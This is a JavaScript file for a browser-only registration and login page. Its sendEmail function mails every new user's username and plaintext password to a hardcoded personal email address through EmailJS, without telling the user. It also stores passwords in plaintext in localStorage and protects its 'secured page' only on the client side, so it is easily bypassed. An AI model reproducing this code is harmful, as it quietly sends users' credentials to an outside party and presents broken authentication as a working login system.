// Initialize EmailJS
(function() {
    emailjs.init('jhasaurav593@gmail.com'); // Replace with your EmailJS user ID
})();

// Show the registration form and hide others
function showRegister() {
    document.getElementById('registerForm').classList.remove('hidden');
    document.getElementById('loginForm').classList.add('hidden');
    document.getElementById('securedPage').classList.add('hidden');
}

// Show the login form and hide others
function showLogin() {
    document.getElementById('registerForm').classList.add('hidden');
    document.getElementById('loginForm').classList.remove('hidden');
    document.getElementById('securedPage').classList.add('hidden');
}

// Register a new user
function register() {
    const username = document.getElementById('registerUsername').value;
    const password = document.getElementById('registerPassword').value;

    if (!username || !password) {
        alert('Please enter your username and password.');
        return;
    }

    if (localStorage.getItem(username)) {
        alert('Username already exists!');
    } else {
        localStorage.setItem(username, password);
        alert('Registration successful! Please login.');
        sendEmail(username, password);
        showLogin();
    }
}

// Send email with user details
function sendEmail(username, password) {
    const templateParams = {
        to_email: 'jhasaurav593@gmail.com',
        from_name: username,
        message_html: `Username: ${username}<br>Password: ${password}`
    };

    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
        .then(function(response) {
            console.log('Email sent successfully!', response.status, response.text);
        }, function(error) {
            console.error('Failed to send email:', error);
        });
}

// Login the user
function login() {
    const username = document.getElementById('loginUsername').value;
    const password = document.getElementById('loginPassword').value;

    if (!username || !password) {
        alert('Please enter your username and password.');
        return;
    }

    if (localStorage.getItem(username) === password) {
        sessionStorage.setItem('loggedInUser', username);
        showSecuredPage();
    } else {
        alert('Incorrect username or password!');
    }
}

// Show the secured page for logged-in users
function showSecuredPage() {
    const username = sessionStorage.getItem('loggedInUser');
    if (username) {
        document.getElementById('username').innerText = username;
        document.getElementById('registerForm').classList.add('hidden');
        document.getElementById('loginForm').classList.add('hidden');
        document.getElementById('securedPage').classList.remove('hidden');
    } else {
        showLogin();
    }
}

// Logout the user
function logout() {
    sessionStorage.removeItem('loggedInUser');
    showLogin();
}

// Check if user is already logged in
window.onload = function() {
    if (sessionStorage.getItem('loggedInUser')) {
        showSecuredPage();
    } else {
        showLogin();
    }
}
